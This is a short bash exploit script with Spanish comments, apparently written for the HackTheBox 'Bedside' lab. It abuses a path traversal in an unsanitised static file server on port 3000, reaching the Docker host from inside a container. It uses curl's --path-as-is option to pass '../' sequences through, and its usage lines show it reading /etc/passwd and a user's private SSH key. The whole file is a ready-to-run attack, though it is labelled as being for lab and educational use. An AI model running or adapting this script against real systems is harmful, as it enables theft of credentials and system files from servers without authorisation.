#!/usr/bin/env bash
# read-host-file.sh — Lee un fichero del HOST a través del path traversal del
# servicio del puerto 3000, EJECUTANDO ESTE SCRIPT DESDE DENTRO DEL CONTENEDOR.
#
# HTB Bedside — SOLO lab autorizado / uso educativo.
#
# Por que --path-as-is: sin el, curl normaliza los '../' de la RUTA en el cliente
# (los colapsa) y nunca llegan al servidor. Con el, la ruta viaja cruda y es el
# static file server (sin saneado) + el SO quienes resuelven el traversal.
#
# Uso:
#   ./read-host-file.sh /etc/passwd
#   ./read-host-file.sh /home/developer/.ssh/id_rsa
#   HOST=172.17.0.1 PORT=3000 ./read-host-file.sh /ruta/absoluta
set -euo pipefail

TARGET="${1:?Uso: $0 /ruta/absoluta/en/host  (p.ej. /etc/passwd)}"
HOST="${HOST:-172.17.0.1}"
PORT="${PORT:-3000}"

# Prefijo generoso de '../' para alcanzar '/' sea cual sea la profundidad del webroot.
# TARGET es absoluto (empieza por '/'), asi que el resultado es .../..${TARGET}.
curl -s --path-as-is "http://${HOST}:${PORT}/../../../../../../..${TARGET}"
